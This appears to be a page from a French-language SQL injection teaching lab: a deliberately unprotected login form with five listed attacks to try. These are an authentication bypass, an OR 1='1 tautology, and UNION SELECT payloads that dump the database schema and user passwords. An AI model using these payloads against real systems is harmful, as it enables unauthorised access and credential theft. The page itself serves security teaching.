<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLI</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body class="darkMode">
    <header>
        <h1>Injections SQL</h1>
        <?php require("../nav.php");?>
    </header>
    <main>
        <section>
            <h2>Requète non protégée</h2>
            <form action="sql_vulnerable.php" method="POST">
                <label for="login">Identifiant : </label>
                <input type="text" name="login" id="login" required/>
                <label for="password">Mot de passe : </label>
                <textarea type="password" name="password" id="password" required></textarea>
                <input type="submit" value="Connexion" />
            </form>
        </section>
        <section>
            <button class="see">Voir le mdp</button>
        </section>
        
        <section>
            <h2>Attaques a tester</h2>
            <dl>
                <dt>Test 1 : Accès normal</dt>
                <dd>login=(pierre) password=(654321) : les comptes de pierre s'affichent</dd>
                <br>
                <dt>Test 2 : Bypass d'authentification</dt>
                <dd>login=(pierre'#) password=(coucou) : les comptes de pierre s'affichent quand même</dd>
                <br>
                <dt>Test 3 : Injection d'évaluation true</dt>
                <dd>login=(coucou) password=(coucou' OR 1='1) : tous les comptes s'affichent</dd>
                <br>
                <dt>Test 4 : Evasion de la table cible</dt>
                <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() # ) : la structure de la base s'affiche</dd>
                <br>
                <dt>Test 5 : Evasion des données d'une table</dt>
                <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT login, pass, id FROM users # ) : les users s'affichent avec les passwords</dd>
            </dl>
        </section>
        <section>
            <h2>Attaques des requêtes non-préparées</h2>
            <code>
                blabla' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() # 
            </code>
            <hr>
            <i>Une fois la requête précédente passée on peut interroger la base via ses noms de colonnes</i>
            <code>
                SELECT login, type, amount FROM accounts AS A JOIN users AS B ON A.id_users = B.id WHERE B.login = 'Indra le Malfrat' AND B.pass = 'blabla' AND 1=0 UNION SELECT concat('User = id : ' , A.id,', login:', A.login, ", password : ", A.pass), concat('Account = ' , B.id,':',B.type), B.amount FROM users AS A JOIN accounts AS B ON B.id_users = A.id #'
            </code>
        </section>
    </main>
    
    <script>
        let input = document.querySelectorAll("input");
        document.querySelector(".see").addEventListener("click", ()=>{
            if(input[1].type == "password"){
                input[1].type = "text";
            } else {
                input[1].type = "password";
            }
        })
    </script>
</body>
</html>